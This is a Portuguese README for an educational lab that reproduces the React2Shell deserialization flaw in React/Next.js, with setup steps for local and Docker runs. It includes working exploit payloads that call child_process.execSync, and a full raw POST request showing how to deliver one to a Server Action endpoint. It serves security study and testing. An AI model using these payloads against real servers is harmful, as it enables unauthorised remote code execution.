# Laboratório de React2Shell

Este repositório contém um **ambiente de laboratório educacional** para estudo e **análise defensiva** da vulnerabilidade conhecida como **React2Shell**, com foco em compreensão de arquitetura, serialização/deserialização e riscos de execução indevida de código em aplicações React/Next.js.

> ⚠️ **Importante**: Este material é destinado **exclusivamente para fins educacionais**, testes locais e ambientes **com autorização explícita**.

---

## 📦 Pré-requisitos

* Node.js **18+** (recomendado LTS)
* npm ou yarn
* Docker (opcional, para execução em contêiner)
* Conhecimentos básicos de:
  * JavaScript / TypeScript
  * React e Next.js
  * Conceitos de segurança de aplicações web

---

## 🚀 Como iniciar a aplicação — Modo Local (sem Docker)

1. **Clonar o repositório**

   ```bash
   git clone <url-do-repositorio>
   cd react2shell-lab
   cd aplication
   ```

2. **Instalar as dependências**

   ```bash
   npm install
   # ou
   yarn install
   ```

3. **Iniciar o servidor de desenvolvimento**

   ```bash
   npm run dev
   # ou
   yarn dev
   ```

4. **Acessar a aplicação**

   Abra o navegador em:

   ```text
   http://localhost:3000
   ```

---

## 🐳 Como iniciar a aplicação — Modo Docker

O Dockerfile disponível realiza um build em dois estágios com permissões restritas, ideal para ambientes de CTF ou testes isolados. A aplicação roda com um usuário sem privilégios (`appuser`) e com o sistema de arquivos em modo somente leitura (`chmod 555`), limitando o impacto de uma exploração bem-sucedida.

### Pré-requisitos

* Docker instalado e em execução ([https://docs.docker.com/get-docker/](https://docs.docker.com/get-docker/))

### Passos

1. **Clonar o repositório**

   ```bash
   git clone <url-do-repositorio>
   cd react2shell-lab
   ```

2. **Construir a imagem Docker**

   ```bash
   docker build -t react2shell-lab .
   ```

3. **Executar o contêiner**

   ```bash
   docker run -p 8080:8080 react2shell-lab
   ```

4. **Acessar a aplicação**

   Abra o navegador em:

   ```text
   http://localhost:8080
   ```

### Opções úteis

Executar em segundo plano (modo *detached*):

```bash
docker run -d -p 8080:8080 --name react2shell-lab react2shell-lab
```

Acompanhar os logs em tempo real:

```bash
docker logs -f react2shell-lab
```

Parar e remover o contêiner:

```bash
docker stop react2shell-lab && docker rm react2shell-lab
```

### Detalhes de segurança do contêiner

| Configuração | Valor |
|---|---|
| Usuário de execução | `appuser` (sem privilégios) |
| Grupo | `appgroup` |
| Permissões do sistema de arquivos | `555` (leitura + execução, sem escrita) |
| Porta exposta | `8080` |
| Estágio de build | Multi-stage (builder + runtime) |

> Essas restrições tornam o ambiente mais representativo de um CTF real, onde o impacto de RCE é limitado pelas permissões do sistema.

---

## 🧪 Objetivo do laboratório

* Compreender como **objetos thenable** podem ser explorados quando manipulados incorretamente
* Analisar riscos associados à **desserialização insegura**
* Demonstrar impactos potenciais em **ambientes de desenvolvimento controlados**
* Estudar o fluxo interno de resolução de Promises e Server Actions

---

## 🧾 Payload JSON para teste

Payload básico utilizado para validar comportamento de resolução e encadeamento de objetos `thenable`:

```json
{
    "status":"resolved_model",
    "reason":-1,
    "_response":{
        "_prefix":"console.log('hello')//",
        "_formData":{"get":"$1:then:constructor"}
    },
    "then":"$1:then",
    "value":"{\"then\":\"$B\"}"
}
```

> Este payload **não executa comandos do sistema** e serve apenas para observar o fluxo de avaliação.

---

## ☢️ Payload JSON (ambiente de laboratório)

Payload demonstrativo para **análise de impacto** em ambiente **local e autorizado**:

```json
{
  "status":"resolved_model",
  "reason":-1,
  "_response":{
    "_prefix":"var res=process.mainModule.require('child_process').execSync('echo isVulnerable!').toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),{digest: `NEXT_REDIRECT;push;/login?a=${res};307;`});",
    "_chunks":"$Q2",
    "_formData":{"get":"$1:constructor:constructor"}
  },
  "then":"$1:__proto__:then",
  "value":"{\"then\":\"$B\"}"
}
```

> ⚠️ **Este payload existe apenas para demonstrar riscos**. Não deve ser utilizado fora de ambientes de teste isolados.

A aplicação do payload pode ser feita através de uma requisição POST para o alvo.

Segue uma demonstração da requisição (não se esqueça de modificar o HOST e a PORTA conforme o modo de execução escolhido!):

```
POST / HTTP/1.1
Host: localhost:3000
Accept-Language: pt-BR,pt;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Next-Action: x
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8j0O2oVc6SWP3Sad
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Content-Length: 710

------WebKitFormBoundaryx8j0O2oVc6SWP3Sad
Content-Disposition: form-data; name="0"

{"then": "$1:__proto__:then", "status": "resolved_model", "reason": -1, "value": "{\"then\":\"$B1337\"}", "_response": {"_prefix": "var res=process.mainModule.require('child_process').execSync('pwd').toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),{digest: 'NEXT_REDIRECT;push;/login?a='+res+';307;'});", "_chunks": "$Q2", "_formData": {"get": "$1:constructor:constructor"}}}
------WebKitFormBoundaryx8j0O2oVc6SWP3Sad
Content-Disposition: form-data; name="1"

"$@0"
------WebKitFormBoundaryx8j0O2oVc6SWP3Sad
Content-Disposition: form-data; name="2"

[]
------WebKitFormBoundaryx8j0O2oVc6SWP3Sad--
```

> 💡 **Lembre-se:** ao usar o modo Docker, substitua `localhost:3000` por `localhost:8080` nas requisições de teste.

---

## 🛡️ Ética, responsabilidade e uso legal

Este laboratório **não incentiva**, **não apoia** e **não endossa**:

* Ataques a sistemas sem autorização
* Exploração em ambientes de produção
* Uso malicioso das informações aqui apresentadas

### Ao utilizar este material, você concorda que:

* Todos os testes serão feitos **apenas em ambientes próprios ou com permissão explícita**
* O objetivo é **aprendizado, pesquisa e defesa**
* Você é responsável por cumprir **leis locais e políticas de uso aceitável**

> Segurança ofensiva **sem ética** não é segurança — é crime.

---

## 📚 Referências recomendadas

* <a href="https://react2shell.com/">React2Shell CVE</a>
* <a href="https://nextjs.org/">Documentação oficial do Next.js</a>
* <a href="https://github.com/lachlan2k">Repositório do Autor da CVE</a>

---

## ✍️ Autor

Material criado para fins educacionais e estudo avançado de segurança em aplicações modernas React/Next.js.